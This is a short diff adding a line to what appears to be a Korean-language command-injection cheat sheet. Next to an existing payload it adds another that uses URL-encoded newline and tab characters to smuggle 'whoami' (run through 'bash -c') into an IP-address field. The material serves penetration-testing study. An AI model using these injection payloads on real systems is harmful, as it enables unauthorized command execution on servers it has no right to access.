@@ -916,6 +916,9 @@ $env:PROGRAMFILES[10]
 
 # 개행 문자 - 새 줄에서 명령 실행
 127.0.0.1%0awhoami
+
+# 개행 문자 + bash + tab(bash -c "whoami")
+127.0.0.1%0abash%09-c%09%22whoami%22
 ```
 
 ---
